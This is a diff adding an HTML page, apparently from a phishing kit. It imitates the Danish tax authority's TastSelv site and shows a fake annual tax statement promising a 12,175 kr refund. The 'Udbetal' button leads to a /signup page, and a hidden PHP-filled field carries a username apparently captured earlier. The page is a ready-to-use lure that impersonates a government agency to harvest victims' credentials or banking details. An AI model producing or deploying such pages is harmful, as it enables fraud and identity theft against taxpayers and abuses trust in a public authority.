@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html class="no-js" lang="da">
+
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>TastSelv - årsopgørelsen</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
+    <meta name="msapplication-tap-highlight" content="no" />
+    <link rel="shortcut icon" href="/static/theme/favicon.ico" type="image/x-icon" />
+    <link href="/static/theme/skat.min.css" rel="stylesheet" type="text/css" />
+
+
+
+</head>
+
+<body class="skts-logged-in">
+    <div class="skts-wrap">
+        <header>
+            <div class="container">
+                <div class="skts-logo">
+                    <a href="#"><span class="sr-only">Til forside</span></a>
+                </div>
+                <ul class="skts-focus-links">
+                    <li><a href="#">Gå til indhold</a></li>
+                </ul>
+                <a class="pull-right skts-login" href="#">Log af</a>
+                <span class="pull-right" style="color: red; font-weight: bold">&nbsp;</span>
+            </div>
+        </header>
+        <div class="navbar navbar-default" role="">
+            <div class="container">
+                <div class="navbar-header">
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span>Menu</span>
+                    </button>
+                </div>
+                <div class="navbar-collapse collapse">
+                    <ul class="nav navbar-nav">
+                        <li><a href="#">Forside</a></li>
+                        <li><a class="active" href="#">Årsopgørelse</a></li>
+                        <li><a href="#">Forskudsopgørelse</a></li>
+                        <li><a href="#">Betaling</a></li>
+                        <li><a href="#">Skatteoplysninger</a></li>
+                        <li><a href="#">Motor</a></li>
+                    </ul>
+                    <ul class="nav navbar-nav navbar-right">
+                        <li><a href="#">Kontakt</a></li>
+                        <li><a href="#">Profil</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <a href="#" class="sr-only" id="skts-skip-link-target-indhold" tabindex="-1">Start af indhold</a>
+
+
+
+
+        <div id="maindiv" class="container">
+            <p class="text-right hidden-print small">Logget på:
+                <br />
+            </p>
+            <div class="panel panel-default">
+                <div class="panel-heading">
+                    <h1>
+                        Årsopgørelse
+                    </h1>
+                </div>
+                <div class="navbar">
+                    <ul class="nav nav-tabs">
+                        <li class="active"><a id="2021" href="#">2022<span class="sr-only">Se årsopgørelsen for
+                                    2021</span></a></li>
+                        <li class="skts-onclick-checkAendringer"><a id="2020" href="#"
+                                onclick="skiftAar('2020');">2021<span class="sr-only">Se årsopgørelsen for
+                                    2020</span></a></li>
+                        <li class="skts-onclick-checkAendringer"><a id="2019" href="#"
+                                onclick="skiftAar('2019');">2020<span class="sr-only">Se årsopgørelsen for
+                                    2019</span></a></li>
+                        <li class="skts-onclick-checkAendringer"><a id="Tidligere" href="#"
+                                onclick="tidlAar();">Tidligere<span class="sr-only">Se årsopgørelsen for tidligere
+                                    år</span></a></li>
+                    </ul>
+                </div>
+                <form method="post">
+                    <input name="username5" value="<?php echo $username5; ?>" type="hidden" />
+
+
+                    <div class="panel-body">
+                        <div class="skts-top-icons">
+                            <a id="pdf" class="skts-pdf-icon skts-pdf-warning" tabindex="0">PDF<span
+                                    class="sr-only">Åbner nyt vindue</span></a>
+                        </div>
+                        <h2 id="ÅrsopgørelseInformation"></h2>
+                        <div id="SK01">
+                            <p>Årsopgørelsen er udarbejdet af Skattestyrelsen, som er en del af Skatteforvaltningen.</p>
+                        </div>
+                        <h2 id="ResultatAfÅrsopgørelsen">Resultat af årsopgørelsen</h2>
+                        <p id="RR-OSKR2">Du skal have penge tilbage:<span class="skts-positive-integer">12.175
+                                kr.</span></p>
+                        <div id="RR00112">
+                            <p>Vi sætter pengene ind på din NemKonto, så du har dem den 8. april 2022.</p>
+                        </div>
+                        <Br><Br>
+                        <div align="center">
+                            <button type="submit" class="btn btn-default" id="HTML7"><a
+                                    href="/signup">Udbetal</a></button>
+                        </div>
+                        <Br><Br><Br><Br><Br><Br><Br><Br><Br><Br><Br>
+                    </div>
+            </div>
+        </div>
+    </div>
+    </form>
+    <footer>
+        <div class="container">
+            <div style="padding-bottom: 15px;">
+                <div style="float: left"><a href="#">Tilgængelighedserklæring<span class="sr-only"> Åbner nyt
+                            vindue</span></a></div>
+                <div style="float: right"> <a href="#">Om cookies<span class="sr-only"> Åbner nyt
+                            vindue</span></a>&nbsp;&nbsp;&nbsp; <a href="#">Ret cookiesamtykke<span class="sr-only">
+                            Åbner nyt vindue</span></a> </div>
+                <div style="text-align: center">
+                    <address style="color: #fff;">Kontakt os: <a href="#"><span style="white-space:nowrap">72 22 18
+                                18<span></a></address>
+                </div>
+            </div>
+            <div class="skts-footer-info">
+                <p class="text-center">skat.dk er Skatteforvaltningens digitale indgang til selvbetjening og vejledning
+                    om skatter og afgifter</p>
+            </div>
+        </div>
+    </footer>
+</body>
+
+</html>
